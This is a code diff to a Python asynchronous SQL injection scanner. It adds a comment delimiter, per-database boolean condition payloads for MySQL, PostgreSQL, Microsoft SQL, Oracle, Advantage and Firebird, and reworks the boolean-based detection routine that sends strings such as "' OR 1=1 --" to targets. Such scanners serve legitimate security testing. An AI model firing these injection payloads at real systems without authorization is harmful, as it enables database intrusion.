@@ -1,4 +1,4 @@
-import argparse, asyncio, aiohttp, time
+import argparse, asyncio, aiohttp, time, re, logging
 from bs4 import BeautifulSoup as BS
 
 class SQLInjectionScanner:
@@ -8,7 +8,7 @@ class SQLInjectionScanner:
         self.database_types = database_types
         self.session = aiohttp.ClientSession()
         self.detected_db_type = None
-        self.DELIMITERS = ["'", '"', ';', ")", "')", '")', '*', '";']
+        self.DELIMITERS = ["'", '"', ';', ")", "')", '")', '*', '";', '--']
         self.DEFAULT_SLEEP_THRESHOLD = 5
         self.db_dict = {
             "MySQL": ['MySQL', 'MySQL Query fail:', 'SQL syntax', 'You have an error in your SQL syntax', 'mssql_query()', 'mssql_num_rows()', '1064 You have an error in your SQL syntax'],
@@ -18,10 +18,37 @@ class SQLInjectionScanner:
             "Advantage_Database": ['AdsCommandException', 'AdsConnectionException', 'AdsException', 'AdsExtendedReader', 'AdsDataReader', 'AdsError'],
             "Firebird": ['Dynamic SQL Error', 'SQL error code', 'arithmetic exception', 'numeric value is out of range', 'malformed string', 'Invalid token']
         }
-        self.conditions = {
-            "SimpleTrue": "1=1",
-            "SimpleFalse": "1=2",
-            "ComplexCondition": "1=1 AND LENGTH(database()) > 5"
+        self.DB_TYPE_CONDITIONS = {
+            "MySQL": {
+                "SimpleTrue": "1=1",
+                "SimpleFalse": "1=2",
+                "ComplexCondition": "1=1 AND LENGTH(database()) > 5"
+            },
+            "PostGre": {
+                "SimpleTrue": "1=1",
+                "SimpleFalse": "1=2",
+                "ComplexCondition": "1=1 AND version() LIKE 'PostgreSQL%'"
+            },
+            "Microsoft_SQL": {
+                "SimpleTrue": "1=1",
+                "SimpleFalse": "1=2",
+                "ComplexCondition": "1=1 AND @@version LIKE 'Microsoft SQL%'"
+            },
+            "Oracle": {
+                "SimpleTrue": "1=1",
+                "SimpleFalse": "1=2",
+                "ComplexCondition": "1=1 AND LENGTH(user) > 5"
+            },
+            "Advantage_Database": {
+                "SimpleTrue": "1=1",
+                "SimpleFalse": "1=2",
+                "ComplexCondition": "1=1 AND AdsErrorCode = 0"
+            },
+            "Firebird": {
+                "SimpleTrue": "1=1",
+                "SimpleFalse": "1=2",
+                "ComplexCondition": "1=1 AND CURRENT_ROLE = 'ADMIN'"
+            }
         }
         self.db_name = None
         self.current_user = None
@@ -93,11 +120,12 @@ class SQLInjectionScanner:
 
         return None
 
-    async def boolean_based_detection(self, database_type, conditions):
+    async def boolean_based_detection(self, database_type):
+        conditions = self.DB_TYPE_CONDITIONS[database_type]
         for condition_name, condition_value in conditions.items():
             payload = f"{database_type}' OR {condition_value} --"
             if await self.perform_injection_detection(payload):
-                print(f"Boolean-Based Injection Detected with condition '{condition_name}'")
+                print(f"Boolean-Based Injection Detected for {database_type} with condition '{condition_name}'")
                 return True
 
         return False
